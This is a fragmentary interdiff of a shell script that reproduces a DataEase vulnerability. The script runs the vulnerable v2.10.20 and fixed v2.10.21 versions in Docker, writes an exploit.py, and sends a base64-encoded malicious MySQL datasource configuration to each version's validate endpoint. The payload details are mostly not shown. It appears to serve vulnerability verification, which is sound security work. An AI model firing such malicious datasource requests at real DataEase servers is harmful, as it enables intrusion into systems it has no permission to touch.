@@ -1,11 +1,9 @@
 --- repro/reproduction_steps.sh
 +++ repro/reproduction_steps.sh
-@@ -7,9 +7,23 @@
+@@ -7,9 +7,21 @@
 
  cd "$ROOT"
 
-+export DOCKER_API_VERSION="${DOCKER_API_VERSION:-1.43}"
-+
  VULN_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.20"
  FIX_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.21"
  MYSQL_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5"
@@ -24,7 +22,7 @@
 
  # Cleanup function
  cleanup() {
-@@ -48,10 +62,48 @@
+@@ -48,10 +60,48 @@
  # Write the exploit Python script
  EXPLOIT_PY="$LOGS/exploit.py"
  cat > "$EXPLOIT_PY" <<'PY'
@@ -75,7 +73,7 @@
 
  malicious_config = {
      "type": "mysql",
-@@ -70,27 +122,44 @@
+@@ -70,27 +120,44 @@
      "configuration": base64.b64encode(json.dumps(malicious_config).encode()).decode()
  }
 
@@ -134,7 +132,7 @@
  # Function to start MySQL + DataEase pair with docker compose
  start_pair() {
      local de_image=$1
-@@ -100,11 +169,12 @@
+@@ -100,11 +167,12 @@
      local de_port=$5
      local base_dir=$6
 
@@ -148,7 +146,7 @@
 
      # MySQL init script
      cat > "$base_dir/bin/mysql/init.sql" <<'EOF'
-@@ -160,10 +230,16 @@
+@@ -160,10 +228,16 @@
        retries: 20
      environment:
        MYSQL_ROOT_PASSWORD: Password123@mysql
@@ -169,7 +167,7 @@
      networks:
        - ${network_name}
 
-@@ -179,16 +255,15 @@
+@@ -179,16 +253,15 @@
        - ${network_name}
      environment:
        - SPRING_PROFILES_ACTIVE=standalone
@@ -195,7 +193,7 @@
 
  networks:
    ${network_name}:
-@@ -206,7 +281,7 @@
+@@ -206,7 +279,7 @@
      local port=$2
      echo "[*] Waiting for DataEase API ($name) on port $port..."
      for i in $(seq 1 180); do
@@ -204,7 +202,7 @@
              echo "[*] DataEase $name is responding on port $port"
              return 0
          fi
-@@ -219,6 +294,7 @@
+@@ -219,6 +292,7 @@
      done
      echo "[ERROR] DataEase $name did not become ready in time"
      docker logs "$name" > "$LOGS/${name}_startup.log" 2>&1 || true
@@ -212,7 +210,7 @@
      return 1
  }
 
-@@ -228,7 +304,7 @@
+@@ -228,7 +302,7 @@
  echo "[1] Testing VULNERABLE version (v2.10.20)"
  echo "=========================================="
 
@@ -221,7 +219,7 @@
  wait_for_dataease dataease-vuln "$VULN_PORT"
 
  echo "[*] Sending malicious datasource validate request to vulnerable version..."
-@@ -245,7 +321,7 @@
+@@ -245,7 +319,7 @@
      VULN_RESULT=1
  fi
 
@@ -230,7 +228,7 @@
  sleep 5
 
  # --- Test FIXED version ---
-@@ -254,7 +330,7 @@
+@@ -254,7 +328,7 @@
  echo "[2] Testing FIXED version (v2.10.21)"
  echo "=========================================="
 
@@ -239,7 +237,7 @@
  wait_for_dataease dataease-fix "$FIX_PORT"
 
  echo "[*] Sending malicious datasource validate request to fixed version..."
-@@ -271,7 +347,7 @@
+@@ -271,7 +345,7 @@
      FIX_RESULT=1
  fi
 
